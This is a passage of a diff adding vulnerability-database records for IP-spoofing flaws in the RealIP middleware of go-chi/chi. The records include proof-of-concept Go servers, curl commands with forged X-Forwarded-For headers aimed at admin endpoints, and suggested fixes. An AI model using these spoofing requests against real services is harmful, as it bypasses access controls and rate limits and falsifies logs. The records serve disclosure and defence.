+   "details": "## Summary\nThe `RealIP` middleware in `go-chi/chi` is vulnerable to IP spoofing because it blindly trusts the first (leftmost) element of the `X-Forwarded-For` HTTP header. This allows a remote attacker to bypass IP-based access control lists (ACLs) and rate-limiting mechanisms by providing a spoofed IP address in the header.\n\n## Details\nIn `middleware/realip.go`, the `realIP` function parses the `X-Forwarded-For` header and extracts the first comma-separated value:\n\n```go\nfunc realIP(r *http.Request) string {\n    // ...\n    } else if xff := r.Header.Get(xForwardedFor); xff != \"\" {\n        ip, _, _ = strings.Cut(xff, \",\")\n    }\n    // ...\n}\n```\n\nStandard practice for `X-Forwarded-For` is that each proxy appends the client's IP to the end of the list. However, since the client can also provide this header, the leftmost values are untrusted. A client can send a header like `X-Forwarded-For: <spoofed_ip>, <actual_proxy_ip>`, and `go-chi/chi` will treat `<spoofed_ip>` as the source of the request.\n\n## Proof of Concept (PoC)\nThe following code demonstrates how an attacker can bypass an IP-based restriction.\n\n```go\npackage main\n\nimport (\n        \"fmt\"\n        \"net/http\"\n        \"net/http/httptest\"\n\n        \"github.com/go-chi/chi/v5\"\n        \"github.com/go-chi/chi/v5/middleware\"\n)\n\nfunc main() {\n        r := chi.NewRouter()\n\n        // Enable the vulnerable RealIP middleware\n        r.Use(middleware.RealIP)\n\n        // An endpoint that should be restricted to a specific administrator IP (1.2.3.4)\n        r.Get(\"/admin/secret\", func(w http.ResponseWriter, r *http.Request) {\n                clientIP := r.RemoteAddr\n                fmt.Printf(\"[Server] Request received from IP: %s\\n\", clientIP)\n\n                // Simulate IP-based access control\n                if clientIP == \"1.2.3.4\" {\n                        w.WriteHeader(http.StatusOK)\n                        w.Write([]byte(\"CONFIDENTIAL: The secret code is 42\\n\"))\n                } else {\n                        w.WriteHeader(http.StatusForbidden)\n                        w.Write([]byte(\"Access Denied: You are not an administrator.\\n\"))\n                }\n        })\n\n        // --- Attack Simulation ---\n        fmt.Println(\"--- PoC: IP Spoofing Attack on chi/middleware.RealIP ---\")\n\n        // 1. Normal Request (Should be denied)\n        req1, _ := http.NewRequest(\"GET\", \"/admin/secret\", nil)\n        rr1 := httptest.NewRecorder()\n        r.ServeHTTP(rr1, req1)\n        fmt.Printf(\"[Client] Normal Request -> Status: %d, Body: %s\", rr1.Code, rr1.Body.String())\n\n        // 2. Spoofed Request (Using X-Forwarded-For)\n        // Attacker claims to be '1.2.3.4'\n        req2, _ := http.NewRequest(\"GET\", \"/admin/secret\", nil)\n        req2.Header.Set(\"X-Forwarded-For\", \"1.2.3.4, 5.6.7.8\") // 5.6.7.8 is a fake proxy IP\n        rr2 := httptest.NewRecorder()\n        r.ServeHTTP(rr2, req2)\n        fmt.Printf(\"[Client] Spoofed Request -> Status: %d, Body: %s\", rr2.Code, rr2.Body.String())\n}\n```\n\n## Impact\nAn attacker can masquerade as any IP address. This can lead to:\n- **Bypass of Authentication/Authorization:** Accessing administrative panels or private APIs restricted by IP.\n- **Rate Limiting Evasion:** Circumbeting rate limiters that use `RemoteAddr` as a key.\n- **Log Forgery:** Causing incorrect IP addresses to be recorded in security logs.\n\n## CWE\n- **CWE-290:** Authentication Bypass by Spoofing\n- **CWE-345:** Insufficient Verification of Data Authenticity\n\n## CVSS Score\n- **CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N** (6.9 Moderate)\n\n## Affected Versions\n- `github.com/go-chi/chi/v5` <= `v5.2.1` (and all previous versions)\n\n## Recommendation\n1.  **Stop using `middleware.RealIP`** if you cannot guarantee that the incoming request headers are from a trusted source and have been sanitized by a proxy.\n2.  Implement a trust-based IP extraction mechanism that verifies the chain of proxies.\n3.  Use the `X-Forwarded-For` header by traversing it from **right to left** and stopping at the first IP address that is not in your list of trusted proxies.\n\n## Suggested Fix\nA secure implementation of `RealIP` should allow developers to specify a list of trusted proxy IP ranges (CIDRs). Below is a conceptual example of how to fix this by traversing the `X-Forwarded-For` header from right to left:\n\n```go\nfunc GetClientIP(r *http.Request, trustedProxies []net.IPNet) string {\n        xff := r.Header.Get(\"X-Forwarded-For\")\n        if xff == \"\" {\n                return r.RemoteAddr\n        }\n\n        ips := strings.Split(xff, \",\")\n        // Traverse from right to left\n        for i := len(ips) - 1; i >= 0; i-- {\n                ipStr := strings.TrimSpace(ips[i])\n                ip := net.ParseIP(ipStr)\n                if ip == nil {\n                        continue\n                }\n\n                if !isTrustedProxy(ip, trustedProxies) {\n                        return ipStr\n                }\n        }\n\n        return r.RemoteAddr\n}\n\nfunc isTrustedProxy(ip net.IP, trustedProxies []net.IPNet) bool {\n        for _, network := range trustedProxies {\n                if network.Contains(ip) {\n                        return true\n                }\n        }\n        return false\n}\n```\n\nBy providing a configuration like `middleware.RealIPWithConfig(Config{TrustedProxies: []string{\"10.0.0.0/8\"}})` , the middleware can safely identify the true client IP even in complex proxy environments.",
+   "aliases": [
+    "CVE-2026-72815",
+    "GO-2026-5774"
+   ],
+   "modified": "2026-09-10T03:50:55.280697424Z",
+   "published": "2026-06-25T18:21:37Z",
+   "database_specific": {
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-06-25T18:21:37Z",
+    "nvd_published_at": null,
+    "cwe_ids": [
+     "CWE-290",
+     "CWE-345"
+    ],
+    "severity": "MODERATE"
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/go-chi/chi"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v5/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v5/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "5.2.1"
+        },
+        {
+         "fixed": "5.3.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-3fxj-6jh8-hvhx/GHSA-3fxj-6jh8-hvhx.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  "CVE-2026-72817": {
+   "id": "CVE-2026-72817",
+   "summary": "go-chi chi 0.9.0 before 5.3.0 IP Spoofing via X-Forwarded-For",
+   "details": "go-chi/chi versions 0.9.0 before 5.3.0 contains an IP spoofing vulnerability in the RealIP middleware, which resolves the request source IP (Request.RemoteAddr) using the first IP in the X-Forwarded-For header without validating trusted proxies. A malicious client can prepend a forged IP as the first value of the X-Forwarded-For header to spoof the request source IP, potentially bypassing access controls or falsifying request logs.",
+   "aliases": [
+    "GHSA-9g5q-2w5x-hmxf",
+    "GO-2026-5775"
+   ],
+   "modified": "2026-10-28T02:30:33.773884778Z",
+   "published": "2026-08-14T11:35:28.824Z",
+   "related": [
+    "openSUSE-SU-2026:11574-1",
+    "openSUSE-SU-2026:11578-1",
+    "openSUSE-SU-2026:11591-1",
+    "openSUSE-SU-2026:11810-1",
+    "openSUSE-SU-2026:21645-1",
+    "openSUSE-SU-2026:21653-1",
+    "openSUSE-SU-2026:21670-1",
+    "openSUSE-SU-2026:21793-1",
+    "openSUSE-SU-2026:21918-1"
+   ],
+   "database_specific": {
+    "cwe_ids": [
+     "CWE-345"
+    ],
+    "osv_generated_from": "https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/72xxx/CVE-2026-72817.json",
+    "cna_assigner": "VulnCheck"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/72xxx/CVE-2026-72817.json"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/go-chi/chi/security/advisories/GHSA-9g5q-2w5x-hmxf"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-72817"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://www.vulncheck.com/advisories/go-chi-chi-before-ip-spoofing-via-x-forwarded-for"
+    }
+   ],
+   "affected": [
+    {
+     "ranges": [
+      {
+       "type": "GIT",
+       "repo": "https://github.com/go-chi/chi",
+       "events": [
+        {
+         "introduced": "c420d7fbf4428b27e31d83591e5e2267d84f9f20"
+        },
+        {
+         "fixed": "3b171578ca44dfd75ca3c5cbddc7b44c600a7b49"
+        }
+       ],
+       "database_specific": {
+        "extracted_events": [
+         {
+          "range": [
+           {
+            "introduced": "0.9.0"
+           },
+           {
+            "fixed": "5.3.0"
+           }
+          ],
+          "source": "AFFECTED_FIELD",
+          "strategy": "StandardRange"
+         },
+         {
+          "source": "DESCRIPTION",
+          "range": [
+           {
+            "introduced": "0.9.0"
+           },
+           {
+            "fixed": "5.3.0"
+           }
+          ]
+         }
+        ]
+       }
+      }
+     ],
+     "versions": [
+      "v5.2.5",
+      "v5.2.4",
+      "v5.2.3",
+      "v5.2.2",
+      "v5.2.1",
+      "v5.2.0",
+      "v5.1.0",
+      "v5.0.14",
+      "v5.0.13",
+      "v5.0.12",
+      "v5.0.11",
+      "v4.1.2",
+      "v3.3.4",
+      "v2.1.0",
+      "v1.5.4",
+      "v5.0.10",
+      "v5.0.9",
+      "v5.0.8",
+      "v5.0.7",
+      "v5.0.6",
+      "v5.0.5",
+      "v5.0.4",
+      "v5.0.3",
+      "v5.0.2",
+      "v5.0.1",
+      "v5.0.0",
+      "v1.5.3",
+      "v1.5.2",
+      "v1.5.1",
+      "v4.1.1",
+      "v4.1.0",
+      "v4.0.4",
+      "v4.0.3",
+      "v4.0.2",
+      "v4.0.1",
+      "v4.0.0",
+      "v3.3.3",
+      "v3.3.2",
+      "v3.3.1",
+      "v3.3.0",
+      "v3.2.1",
+      "v3.2.0",
+      "v3.1.5",
+      "v3.1.4",
+      "v3.1.3",
+      "v3.1.2",
+      "v3.1.1",
+      "v3.1.0",
+      "v3.0.0",
+      "v2.0.0",
+      "v1.0.0",
+      "v0.9.0"
+     ],
+     "database_specific": {
+      "source": "https://storage.googleapis.com/cve-osv-conversion/osv-output/CVE-2026-72817.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.2",
+   "severity": [
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  "GHSA-9g5q-2w5x-hmxf": {
+   "id": "GHSA-9g5q-2w5x-hmxf",
+   "summary": "chi Middleware Vulnerable to Potential IP Spoofing via `X-Forwarded-For` Header in `Request.RemoteAddr` Resolution",
+   "details": "### Summary\nThe vulnerability allows the `Request.RemoteAddr` to be spoofed when determining the request source IP via the `X-Forwarded-For` header. This could result in misidentification of the request source and potentially compromise access control and logging integrity.\n\n### Details\nCurrently, the `RealIP()` implementation splits the `X-Forwarded-For` header by `,` and uses the first IP.\nhttps://github.com/go-chi/chi/blob/v5.1.0/middleware/realip.go#L50-L54\n\nHowever, relying on the first IP in the `X-Forwarded-For` header is insecure because it can be manipulated by attackers to falsify the source IP.\n\nMalicious Case:\n1. A malicious client sends a request with a forged IP in the X-Forwarded-For header: `X-Forwarded-For: <forged-ip>`\n2. The proxy appends the actual client\u2019s IP and forwards the request: `X-Forwarded-For: <forged-ip>,<client-ip>`\n3. If the server always uses the first IP, it becomes vulnerable to IP spoofing.\n\nIdeally, the implementation should verify IPs starting from the end of the `X-Forwarded-For` header value, skipping trusted IPs within the system, and using the first untrusted IP as the actual client IP.\n\nFor example, the `labstack/echo` web framework processes the `X-Forwarded-For` header by checking IPs from the end, skipping trusted IPs, and using the first untrusted IP as the client's ip.\nhttps://github.com/labstack/echo/blob/v4.13.2/ip.go#L261-L273\n\n### PoC\n#### 1. Run the Go application with the following code:\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n\n    \"github.com/go-chi/chi/v5/middleware\"\n)\n\nfunc main() {\n    // Set handler to print the remote address\n    handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        fmt.Fprintln(\n            w,\n            fmt.Sprintf(\"remote addr: %s (want 192.0.2.1)\", r.RemoteAddr),\n        )\n    })\n    // Use RealIP middleware\n    log.Fatal(http.ListenAndServe(\":8080\", middleware.RealIP(handler)))\n}\n```\n#### 2. Send a request to the server using curl with a manipulated X-Forwarded-For header:\n```\n$ curl localhost:8080 -H 'X-Forwarded-For: 192.0.2.2, 192.0.2.1'\nremote addr: 192.0.2.2 (want 192.0.2.1)\n```\n\n### Impact\nThis vulnerability can lead to a request source IP spoofing issue, which may allow attackers to bypass access controls or falsify request logs. It primarily affects systems that rely on X-Forwarded-For to determine the actual client IP, particularly in scenarios where intermediary proxies or load balancers are involved.",
+   "aliases": [
+    "CVE-2026-72817",
+    "GO-2026-5775"
+   ],
+   "modified": "2026-09-10T03:50:49.185556459Z",
+   "published": "2026-06-25T18:18:56Z",
+   "database_specific": {
+    "github_reviewed_at": "2026-06-25T18:18:56Z",
+    "nvd_published_at": null,
+    "cwe_ids": [
+     "CWE-346"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/go-chi/chi/security/advisories/GHSA-9g5q-2w5x-hmxf"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/go-chi/chi"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/go-chi/chi/releases/tag/v5.3.0"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0.9.0"
+        },
+        {
+         "last_affected": "1.5.5"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9g5q-2w5x-hmxf/GHSA-9g5q-2w5x-hmxf.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v2/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v2/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "2.1.1"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9g5q-2w5x-hmxf/GHSA-9g5q-2w5x-hmxf.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v3/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v3/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "3.3.5"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9g5q-2w5x-hmxf/GHSA-9g5q-2w5x-hmxf.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v4/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v4/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "4.1.3"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9g5q-2w5x-hmxf/GHSA-9g5q-2w5x-hmxf.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v5/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v5/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "5.3.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9g5q-2w5x-hmxf/GHSA-9g5q-2w5x-hmxf.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
+    }
+   ]
+  },
+  "CVE-2026-72816": {
+   "id": "CVE-2026-72816",
+   "summary": "go-chi chi before 5.3.0 IP Spoofing via RealIP Middleware",
+   "details": "go-chi/chi through 5.2.1 contains an IP spoofing vulnerability in the RealIP middleware (middleware/realip.go). The realIP() function reads client-controlled headers (True-Client-IP, X-Real-IP, and X-Forwarded-For) and overwrites r.RemoteAddr without verifying that the request originated from a trusted proxy. Attackers can supply arbitrary IP addresses in these headers to bypass IP-based access controls, evade rate limiting and geo-IP restrictions, and pollute audit logs. Fixed in 5.3.0.",
+   "aliases": [
+    "GHSA-rjr7-jggh-pgcp",
+    "GO-2026-5777"
+   ],
+   "modified": "2026-10-28T02:30:49.292032754Z",
+   "published": "2026-08-14T11:35:28.145Z",
+   "related": [
+    "openSUSE-SU-2026:21645-1",
+    "openSUSE-SU-2026:21653-1",
+    "openSUSE-SU-2026:21670-1",
+    "openSUSE-SU-2026:21793-1",
+    "openSUSE-SU-2026:21918-1"
+   ],
+   "database_specific": {
+    "cna_assigner": "VulnCheck",
+    "cwe_ids": [
+     "CWE-290"
+    ],
+    "osv_generated_from": "https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/72xxx/CVE-2026-72816.json"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/CVEProject/cvelistV5/tree/main/cves/2026/72xxx/CVE-2026-72816.json"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-72816"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://www.vulncheck.com/advisories/go-chi-chi-before-ip-spoofing-via-realip-middleware"
+    }
+   ],
+   "affected": [
+    {
+     "ranges": [
+      {
+       "type": "GIT",
+       "repo": "https://github.com/go-chi/chi",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "3b171578ca44dfd75ca3c5cbddc7b44c600a7b49"
+        }
+       ],
+       "database_specific": {
+        "extracted_events": [
+         {
+          "strategy": "StandardRange",
+          "range": [
+           {
+            "introduced": "0"
+           },
+           {
+            "fixed": "5.3.0"
+           }
+          ],
+          "source": "AFFECTED_FIELD"
+         }
+        ]
+       }
+      }
+     ],
+     "versions": [
+      "v5.2.5",
+      "v5.2.4",
+      "v5.2.3",
+      "v5.2.2",
+      "v5.2.1",
+      "v5.2.0",
+      "v5.1.0",
+      "v5.0.14",
+      "v5.0.13",
+      "v5.0.12",
+      "v5.0.11",
+      "v4.1.2",
+      "v3.3.4",
+      "v2.1.0",
+      "v1.5.4",
+      "v5.0.10",
+      "v5.0.9",
+      "v5.0.8",
+      "v5.0.7",
+      "v5.0.6",
+      "v5.0.5",
+      "v5.0.4",
+      "v5.0.3",
+      "v5.0.2",
+      "v5.0.1",
+      "v5.0.0",
+      "v1.5.3",
+      "v1.5.2",
+      "v1.5.1",
+      "v4.1.1",
+      "v4.1.0",
+      "v4.0.4",
+      "v4.0.3",
+      "v4.0.2",
+      "v4.0.1",
+      "v4.0.0",
+      "v3.3.3",
+      "v3.3.2",
+      "v3.3.1",
+      "v3.3.0",
+      "v3.2.1",
+      "v3.2.0",
+      "v3.1.5",
+      "v3.1.4",
+      "v3.1.3",
+      "v3.1.2",
+      "v3.1.1",
+      "v3.1.0",
+      "v3.0.0",
+      "v2.0.0",
+      "v1.0.0",
+      "v0.9.0"
+     ],
+     "database_specific": {
+      "source": "https://storage.googleapis.com/cve-osv-conversion/osv-output/CVE-2026-72816.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.2",
+   "severity": [
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  "GHSA-rjr7-jggh-pgcp": {
+   "id": "GHSA-rjr7-jggh-pgcp",
+   "summary": "chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header",
+   "details": "### Summary\nrealip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls\n\n### Details\n\nthe vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy\n\n```go\nfunc realIP(r *http.Request) string {\n    var ip string\n    if tcip := r.Header.Get(trueClientIP); tcip != \"\" {\n        ip = tcip  // controlled by attacker\n    } else if xrip := r.Header.Get(xRealIP); xrip != \"\" {\n        ip = xrip  // controlled by attacker\n    } else if xff := r.Header.Get(xForwardedFor); xff != \"\" {\n        ip, _, _ = strings.Cut(xff, \",\")  // controlled by attacker\n    }\n    // ...\n    return ip\n}\n```\n\nno trusted proxy cidr check in place, any client can send these headers\n\n### PoC\n\ncreate a server with chi and use realip middleware\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"github.com/go-chi/chi/v5\"\n    \"github.com/go-chi/chi/v5/middleware\"\n)\n\nfunc main() {\n    r := chi.NewRouter()\n    r.Use(middleware.RealIP)\n\n    r.Get(\"/admin\", func(w http.ResponseWriter, r *http.Request) {\n        // ip-based access control got bypassed\n        if r.RemoteAddr == \"127.0.0.1\" {\n            w.Write([]byte(\"SECRET ADMIN DATA\"))\n            return\n        }\n        http.Error(w, \"Forbidden\", 403)\n    })\n\n    http.ListenAndServe(\":8080\", r)\n}\n```\n\nspoofed the ip to bypass access control\n\n```bash\ncurl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin\n```\n\n\n### Impact\n\n- ip-based access control bypass lets attackers reach restricted endpoints\n- rate limiting bypass lets attackers avoid limits by rotating spoofed ips\n- audit logs show fake ips picked by attacker instead of real ones\n- attackers can get around geo ip restrictions\n\n## Remediation Recommendation\n\nvalidate proxy cidr first before trusting forwarded ip headers\n\n```go\n// add your reverse proxy ip addresses here\nvar trustedProxies = []net.IPNet{\n       {IP: net.ParseIP(\"10.0.0.0\"), Mask: net.CIDRMask(8, 32)},\n    {IP: net.ParseIP(\"172.16.0.0\"), Mask: net.CIDRMask(12, 32)},\n    {IP: net.ParseIP(\"192.168.0.0\"), Mask: net.CIDRMask(16, 32)},\n}\n\nfunc isTrustedProxy(ip net.IP) bool {\n    for _, cidr := range trustedProxies {\n        if cidr.Contains(ip) {\n            return true\n        }\n    }\n    return false\n}\n```",
+   "aliases": [
+    "CVE-2026-72816",
+    "GO-2026-5777"
+   ],
+   "modified": "2026-09-10T03:50:50.389336190Z",
+   "published": "2026-06-25T18:19:15Z",
+   "database_specific": {
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-06-25T18:19:15Z",
+    "nvd_published_at": null,
+    "cwe_ids": [
+     "CWE-290",
+     "CWE-348"
+    ]
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/go-chi/chi/security/advisories/GHSA-rjr7-jggh-pgcp"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/go-chi/chi"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/go-chi/chi/releases/tag/v5.3.0"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "1.5.5"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-rjr7-jggh-pgcp/GHSA-rjr7-jggh-pgcp.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v2/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v2/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "2.1.1"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-rjr7-jggh-pgcp/GHSA-rjr7-jggh-pgcp.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v3/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v3/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "3.3.5"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-rjr7-jggh-pgcp/GHSA-rjr7-jggh-pgcp.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v4/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v4/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "last_affected": "4.1.3"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-rjr7-jggh-pgcp/GHSA-rjr7-jggh-pgcp.json"
+     }
+    },
+    {
+     "package": {
+      "name": "github.com/go-chi/chi/v5/middleware",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/go-chi/chi/v5/middleware"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "5.3.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-rjr7-jggh-pgcp/GHSA-rjr7-jggh-pgcp.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
+    }
+   ]
+  }
+ }
+}
